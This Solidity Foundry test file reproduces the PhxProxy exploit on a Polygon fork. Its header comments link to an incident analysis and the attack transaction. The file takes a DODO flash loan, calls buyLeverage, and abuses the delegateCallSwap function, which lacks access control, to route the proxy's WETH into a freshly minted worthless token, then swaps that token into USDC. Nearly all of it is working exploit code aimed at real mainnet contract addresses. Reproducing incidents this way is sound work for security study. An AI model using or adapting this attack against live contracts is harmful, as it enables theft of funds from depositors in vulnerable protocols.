// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/HypernativeLabs/status/1633090456157401088
// @TX
// https://polygonscan.com/tx/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4
// @Summary
// PhxProxy contract delegateCallSwap() function lack of access control and can be passed in any parameter
// The lost money is mainly USDC in the d028 contract which the attacker converts into WETH in the 65ba contract through the buyLeverage function
// and then swaps it into his own tokens by the delegateCallSwap function, making a profit from it

interface IPHXPROXY {
    function buyLeverage(uint256 amount, uint256 minAmount, uint256 deadLine, bytes calldata /*data*/ ) external;
    function delegateCallSwap(bytes memory data) external;
}

contract ContractTest is Test {
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    SHITCOIN MYTOKEN;
    IPHXPROXY phxProxy = IPHXPROXY(0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de);
    Uni_Router_V2 Router = Uni_Router_V2(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
    address dodo = 0x1093ceD81987Bf532c2b7907B2A8525cd0C17295;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("polygon", 40_066_946);
        vm.label(address(USDC), "USDC");
        vm.label(address(WETH), "WETH");
        vm.label(address(phxProxy), "phxProxy");
        vm.label(address(Router), "Router");
        vm.label(address(dodo), "dodo");
    }

    function testExploit() public {
        deal(address(WETH), address(this), 7 * 1e15);
        MYTOKEN = new SHITCOIN();
        MYTOKEN.mint(1_500_000 * 1e18);
        MYTOKEN.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);
        Router.addLiquidity(address(MYTOKEN), address(WETH), 7 * 1e15, 7 * 1e15, 0, 0, address(this), block.timestamp);

        DVM(dodo).flashLoan(0, 8000 * 1e6, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        USDC.approve(address(phxProxy), type(uint256).max);
        phxProxy.buyLeverage(8000 * 1e6, 0, block.timestamp, new bytes(0));
        uint256 swapAmount = WETH.balanceOf(address(phxProxy));
        bytes memory swapData =
            abi.encodeWithSelector(0xa9678a18, address(Router), address(WETH), address(MYTOKEN), swapAmount);
        phxProxy.delegateCallSwap(swapData); // WETH swap to MYTOKEN

        address[] memory path = new address[](3);
        path[0] = address(MYTOKEN);
        path[1] = address(WETH);
        path[2] = address(USDC);
        Router.swapExactTokensForTokens(1_000_000 * 1e18, 0, path, address(this), block.timestamp); // MYTOKEN swap to USDC

        USDC.transfer(dodo, 8000 * 1e6);
    }
}

contract SHITCOIN {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "SHIT COIN";
    string public symbol = "SHIT";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}
